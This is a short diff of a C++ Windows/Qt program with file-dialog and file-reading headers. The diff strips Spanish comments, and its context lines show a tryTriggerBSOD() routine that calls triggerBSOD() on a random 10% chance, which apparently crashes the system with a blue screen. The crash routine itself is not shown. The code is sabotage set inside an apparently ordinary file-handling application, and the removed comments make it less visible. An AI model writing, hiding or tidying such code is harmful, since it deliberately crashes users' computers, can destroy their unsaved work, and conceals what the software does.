@@ -1,6 +1,6 @@
 #include <windows.h>
-#include <cstdlib>  // Para rand() y srand()
-#include <ctime>    // Para time()
+#include <cstdlib>
+#include <ctime>
 #include <QFileDialog>
 #include <QFile>
 #include <QTextStream>
@@ -31,8 +31,8 @@ void triggerBSOD() {
 }
 
 void tryTriggerBSOD() {
-    srand(time(nullptr)); // Inicializar la semilla aleatoria
-    int randomValue = rand() % 100; // Número aleatorio entre 0 y 99
+    srand(time(nullptr));
+    int randomValue = rand() % 100;
 
     if (randomValue < 10) triggerBSOD();
 }
